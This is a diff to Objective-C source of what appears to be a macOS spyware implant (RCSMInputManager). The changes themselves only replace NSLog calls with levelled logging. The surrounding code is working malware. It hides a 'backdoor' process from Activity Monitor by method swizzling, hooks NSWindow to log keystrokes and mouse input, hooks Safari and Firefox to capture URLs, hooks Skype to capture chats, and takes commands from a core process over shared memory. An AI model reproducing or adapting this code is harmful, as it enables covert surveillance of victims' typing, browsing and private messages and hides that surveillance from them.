@@ -65,7 +65,7 @@ static int voipFlag         = 0;
 OSErr InjectEventHandler(const AppleEvent *ev, AppleEvent *reply, long refcon)
 {
 #ifdef DEBUG_INPUT_MANAGER
-  NSLog(@"Injected event handler called");
+  verboseLog(@"Injected event handler called");
 #endif
   
   OSErr resultCode = noErr;
@@ -80,14 +80,14 @@ OSErr InjectEventHandler(const AppleEvent *ev, AppleEvent *reply, long refcon)
     {
       err = AEGetDescData(&intDesc, &value, sizeof(SInt32));
 #ifdef DEBUG_INPUT_MANAGER
-      NSLog(@"Received backdoor pid: %d", value);
+      verboseLog(@"Received backdoor pid: %ld", value);
 #endif
     }
   
   gBackdoorPID = value;
   
 #ifdef DEBUG_INPUT_MANAGER
-  NSLog(@"%s: running RCSeload event handler", __FUNCTION__);
+  verboseLog(@"%s: running RCSeload event handler", __FUNCTION__);
 #endif
     
   return resultCode;
@@ -99,8 +99,8 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   const char *name    = sel_getName(_original);
   const char *newName = sel_getName(_newMethod);
   
-  NSLog(@"SEL Name: %s", name);
-  NSLog(@"SEL newName: %s", newName);
+  verboseLog(@"SEL Name: %s", name);
+  verboseLog(@"SEL newName: %s", newName);
 #endif
   
   Method methodOriginal = class_getInstanceMethod(_class, _original);
@@ -108,7 +108,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   if (methodOriginal == nil)
     {
 #ifdef DEBUG_INPUT_MANAGER
-      NSLog(@"Message not found [%s %s]\n", class_getName(_class), name);
+      errorLog(@"Message not found [%s %s]\n", class_getName(_class), name);
 #endif
       
       return FALSE;
@@ -120,13 +120,13 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   if (!class_addMethod (_class, _newMethod, _newImplementation, type))
     {
 #ifdef DEBUG_INPUT_MANAGER
-      NSLog(@"Failed to add our new method - probably already exists");
+      errorLog(@"Failed to add our new method - probably already exists");
 #endif
     }
   else
     {
 #ifdef DEBUG_INPUT_MANAGER
-      NSLog(@"Method added to target class");
+      verboseLog(@"Method added to target class");
 #endif
     }
   
@@ -135,7 +135,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   if (methodNew == nil)
     {
 #ifdef DEBUG_INPUT_MANAGER
-      NSLog(@"Message not found [%s %s]\n", class_getName(_class), newName);
+      errorLog(@"Message not found [%s %s]\n", class_getName(_class), newName);
 #endif
     
       return FALSE;
@@ -150,7 +150,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 
 - (int)outlineViewHook: (id)arg1 numberOfChildrenOfItem: (id)arg2;
 - (id)filteredProcessesHook;
- 
+
 @end
 
 @implementation mySMProcessController
@@ -160,7 +160,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   if (gBackdoorPID == 0)
     {
 #ifdef DEBUG_INPUT_MANAGER
-      NSLog(@"gBackdoorPid not initialized");
+      verboseLog(@"gBackdoorPid not initialized");
 #endif
       
       return [self outlineViewHook: arg1
@@ -170,7 +170,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   if (arg2 == nil)
     {
 #ifdef DEBUG_INPUT_MANAGER
-      NSLog(@"Asking for how many processes");
+      verboseLog(@"Asking for how many processes");
 #endif
     }
   
@@ -178,7 +178,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
          numberOfChildrenOfItem: arg2];
 
 #ifdef DEBUG_INPUT_MANAGER
-  NSLog(@"Total processes: %d", a);
+  verboseLog(@"Total processes: %d", a);
 #endif
 
   if (a > 0)
@@ -190,13 +190,13 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 - (id)filteredProcessesHook
 {
 #ifdef DEBUG_INPUT_MANAGER
-  NSLog(@"%s", __func__);
+  verboseLog(@"");
 #endif
   
   if (gBackdoorPID == 0)
     {
 #ifdef DEBUG_INPUT_MANAGER
-      NSLog(@"gBackdoorPid not initialized");
+      verboseLog(@"gBackdoorPid not initialized");
 #endif
       
       return [self filteredProcessesHook];
@@ -211,7 +211,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
       if ([[object performSelector: @selector(pid)] intValue] == gBackdoorPID)
         {
 #ifdef DEBUG_INPUT_MANAGER
-          NSLog(@"object matched: %@", object);
+          verboseLog(@"object matched: %@", object);
 #endif
           
           [a removeObject: object];
@@ -264,7 +264,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   if (err != noErr)
     {
 #ifdef DEBUG_INPUT_MANAGER
-      NSLog(@"%s - Unable to obtain system version: %ld", __FUNCTION__, (long)err);
+      errorLog(@"%s - Unable to obtain system version: %ld", __FUNCTION__, (long)err);
 #endif
     
       if (major)
@@ -278,6 +278,11 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 
 + (void)load
 {
+#ifdef ENABLE_LOGGING
+  [RCSMLogger setComponent: @"im"];
+  [RCSMLogger enableProcessNameVisualization: YES];
+#endif
+  
   // First thing we need to initialize the shared memory segments
   NSString *bundleIdentifier = [[NSBundle mainBundle] bundleIdentifier];
   
@@ -299,7 +304,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
       if (gOSMajor == 10 && gOSMinor == 6)
         {
 #ifdef DEBUG_INPUT_MANAGER
-          warnLog(@"running osax bundle");
+          verboseLog(@"running osax bundle");
 #endif
           [NSThread detachNewThreadSelector: @selector(startCoreCommunicator)
                                    toTarget: self
@@ -326,7 +331,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
       if (gOSMajor == 10 && gOSMinor == 6)
         {
 #ifdef DEBUG_INPUT_MANAGER
-          warnLog(@"running osax bundle");
+          verboseLog(@"running osax bundle");
 #endif
           [NSThread detachNewThreadSelector: @selector(startCoreCommunicator)
                                    toTarget: self
@@ -371,7 +376,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 + (void)checkForCommands
 {
 #ifdef DEBUG_INPUT_MANAGER
-  NSLog(@"checkForCommands()");
+  verboseLog(@"");
 #endif
   
   NSMutableData *readData;
@@ -414,13 +419,13 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
                     if ([commManager performSync] == FALSE)
                       {
 #ifdef DEBUG_INPUT_MANAGER
-                        NSLog(@"Sync failed from Safari");
+                        infoLog(@"Sync failed from Safari");
 #endif
                       }
                     else
                       {
 #ifdef DEBUG_INPUT_MANAGER
-                        NSLog(@"Sync from Safari went OK!");
+                        infoLog(@"Sync from Safari went OK!");
 #endif
                       }
                     
@@ -445,7 +450,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 #ifdef DEBUG_INPUT_MANAGER
   NSString *bundleIdentifier = [[NSBundle mainBundle] bundleIdentifier];
   
-  NSLog(@"RCSMInputManager loaded by %@ at path %@", bundleIdentifier,
+  infoLog(@"RCSMInputManager loaded by %@ at path %@", bundleIdentifier,
         [[NSBundle mainBundle] bundlePath]);
 #endif
   [NSThread detachNewThreadSelector: @selector(startCoreCommunicator)
@@ -466,7 +471,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   shMemoryCommand *shMemCommand;
   
 #ifdef DEBUG_INPUT_MANAGER
-  NSLog(@"[DYLIB] %s: reading from shared", __FUNCTION__);
+  verboseLog(@"[DYLIB] %s: reading from shared", __FUNCTION__);
 #endif
   
   // On leopard we get pid on shmem
@@ -483,13 +488,13 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
               shMemCommand = (shMemoryCommand *)[readData bytes];
               
 #ifdef DEBUG_INPUT_MANAGER
-              NSLog(@"[DYLIB] %s: shmem", __FUNCTION__);
+              verboseLog(@"[DYLIB] %s: shmem", __FUNCTION__);
 #endif
               if (shMemCommand->command == CR_CORE_PID)
                 {
                   memcpy(&gBackdoorPID, shMemCommand->commandData, sizeof(pid_t));
 #ifdef DEBUG_INPUT_MANAGER
-                  NSLog(@"[DYLIB] %s: receiving core pid %d", __FUNCTION__, gBackdoorPID);
+                  verboseLog(@"[DYLIB] %s: receiving core pid %d", __FUNCTION__, gBackdoorPID);
 #endif
                   break;
                 }
@@ -505,7 +510,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   if (className != nil)
     {
 #ifdef DEBUG_INPUT_MANAGER
-      NSLog(@"Class SMProcessController swizzling");
+      verboseLog(@"Class SMProcessController swizzling");
 #endif
       swizzleByAddingIMP(className, @selector(outlineView:numberOfChildrenOfItem:),
                          class_getMethodImplementation(classSource, @selector(outlineViewHook:numberOfChildrenOfItem:)),
@@ -518,7 +523,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   else
     {
 #ifdef DEBUG_INPUT_MANAGER
-      NSLog(@"Class SMProcessController not found");
+      errorLog(@"Class SMProcessController not found");
 #endif
     }
   
@@ -533,7 +538,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   if ([bundleIdentifier isEqualToString: @"com.apple.ActivityMonitor"] == YES)
     {
 #ifdef DEBUG_INPUT_MANAGER
-      NSLog(@"Starting hiding for activity Monitor");
+      infoLog(@"Starting hiding for activity Monitor");
 #endif
       
 #ifndef NO_PROC_HIDING
@@ -544,13 +549,13 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   usleep(500000);
   
 #ifdef DEBUG_INPUT_MANAGER
-  NSLog(@"Core Communicator thread launched");  
+  infoLog(@"Core Communicator thread launched");  
 #endif
   
   if ([bundleIdentifier isEqualToString: @"com.apple.securityagent"] == YES)
     {
 #ifdef DEBUG_INPUT_MANAGER
-      NSLog(@"Exiting from security Agent");
+      infoLog(@"Exiting from security Agent");
 #endif
       //
       // Avoid to inject into securityagent since we don't need it for now
@@ -569,7 +574,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
       NSMutableData *readData;
       shMemoryCommand *shMemCommand;
       
-      // Silly Code but it's faster than a switch/case inside the loop
+      // Silly Code but it's faster than a switch/case inside a loop
       readData = [mSharedMemoryCommand readMemory: OFFT_URL
                                     fromComponent: COMP_AGENT];
       
@@ -580,7 +585,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
           if (urlFlag == 0 && shMemCommand->command == AG_START)
             {
 #ifdef DEBUG_INPUT_MANAGER
-              NSLog(@"Started URL Agent");
+              infoLog(@"Started URL Agent");
 #endif
               urlFlag = 1;
             }
@@ -689,7 +694,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
         {
           urlFlag = 2;
 #ifdef DEBUG_INPUT_MANAGER
-          NSLog(@"Hooking URLs");
+          infoLog(@"Hooking URLs");
 #endif
           
           //
@@ -709,7 +714,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
           else
             {
 #ifdef DEBUG_INPUT_MANAGER
-              NSLog(@"Not the right application, skipping");
+              warnLog(@"URL - not the right application, skipping");
 #endif
             }
           // End of Safari
@@ -726,12 +731,12 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
                                                        locale: [NSLocale currentLocale]];
   
 #ifdef DEBUG_INPUT_MANAGER
-          NSLog(@"Comparing %@ vs. %@ (%d)", applicationName, firefoxAppName, result);
+          infoLog(@"Comparing %@ vs. %@ (%d)", applicationName, firefoxAppName, result);
 #endif
           if (result == NSOrderedSame)
             {
 #ifdef DEBUG_INPUT_MANAGER
-              NSLog(@"Hooking fairfocs baby!");
+              infoLog(@"Hooking fairfocs baby!");
 #endif  
               Class className = objc_getClass("NSWindow");
               
@@ -746,7 +751,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
         {
           urlFlag = 0;
 #ifdef DEBUG_INPUT_MANAGER
-          NSLog(@"Unhooking URLs");
+          infoLog(@"Unhooking URLs");
 #endif
           
           Class className = objc_getClass("BrowserWindowController");
@@ -760,7 +765,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
           else
             {
 #ifdef DEBUG_INPUT_MANAGER
-              NSLog(@"Not the right application, skipping");
+              warnLog(@"URL - not the right application, skipping");
 #endif
             }
         
@@ -778,11 +783,11 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
                                                           range: strRange
                                                          locale: [NSLocale currentLocale]];
           
-          NSLog(@"Comparing %@ vs. %@ (%d)", application_name, firefox_app, firefox_res);
+          infoLog(@"Comparing %@ vs. %@ (%d)", application_name, firefox_app, firefox_res);
           
           if(firefox_res == NSOrderedSame)
             {
-              NSLog(@"Hooking fairfocs baby!");
+              infoLog(@"Hooking fairfocs baby!");
               
               Class className = objc_getClass("NSWindow");
               
@@ -803,7 +808,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
           if (mouseFlag == 0 || mouseAgentIsActive == 0)
             {
 #ifdef DEBUG_INPUT_MANAGER
-              NSLog(@"Hooking keyboard");
+              infoLog(@"Hooking keyboard");
 #endif
               
               swizzleMethod(className, @selector(hookKeyboardAndMouse:),
@@ -812,7 +817,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
           else
             {
 #ifdef DEBUG_INPUT_MANAGER
-              NSLog(@"Hooking mouse and keyboard from keyb");
+              infoLog(@"Hooking mouse and keyboard from keyb");
 #endif
             }
           
@@ -828,7 +833,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
           keylogAgentIsActive = 0;
           
 #ifdef DEBUG_INPUT_MANAGER
-          NSLog(@"Unhooking keyboard");
+          infoLog(@"Unhooking keyboard");
 #endif
           Class className = objc_getClass("NSWindow");
           
@@ -855,7 +860,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
           if (keyboardFlag == 0 || keylogAgentIsActive == 0)
             {
 #ifdef DEBUG_INPUT_MANAGER
-              NSLog(@"Hooking mouse");
+              infoLog(@"Hooking mouse");
 #endif
               
               swizzleMethod(className, @selector(hookKeyboardAndMouse:),
@@ -864,7 +869,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
           else
             {
 #ifdef DEBUG_INPUT_MANAGER
-              NSLog(@"Hooking mouse and keyboard from mouse");
+              infoLog(@"Hooking mouse and keyboard from mouse");
 #endif
             }
         }
@@ -874,7 +879,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
           mouseAgentIsActive = 0;
           
 #ifdef DEBUG_INPUT_MANAGER
-          NSLog(@"Unhooking mouse");
+          infoLog(@"Unhooking mouse");
 #endif
           
           if (keyboardFlag == 0)
@@ -890,7 +895,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
         {
           imFlag = 2;
 #ifdef DEBUG_INPUT_MANAGER
-          NSLog(@"Hooking IMs");
+          infoLog(@"Hooking IMs");
 #endif          
           // In order to avoid a linker error for a missing implementation
           Class className   = objc_getClass("SkypeChat");
@@ -907,7 +912,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
         {
           imFlag = 0;
 #ifdef DEBUG_INPUT_MANAGER
-          NSLog(@"Unhooking IMs");
+          infoLog(@"Unhooking IMs");
 #endif
           // In order to avoid a linker error for a missing implementation
           Class className = objc_getClass("SkypeChat");
